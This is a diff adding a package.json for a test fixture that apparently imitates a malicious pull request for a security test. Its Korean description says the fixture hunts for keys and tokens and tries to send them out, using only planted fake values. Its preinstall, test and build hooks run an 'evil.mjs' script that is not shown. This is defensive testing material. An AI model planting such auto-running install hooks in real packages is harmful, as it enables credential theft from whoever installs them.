@@ -1,0 +1,11 @@
+{
+  "name": "malicious-pr-fixture",
+  "version": "1.0.0",
+  "private": true,
+  "description": "S4 보안 시험용 '악성 PR' 흉내. 열쇠·토큰을 찾고 밖으로 보내려 한다. 실제 열쇠는 없다(시험이 넣은 가짜 값만 찾음).",
+  "scripts": {
+    "preinstall": "node evil.mjs install",
+    "test": "node evil.mjs test",
+    "build": "node evil.mjs build"
+  }
+}
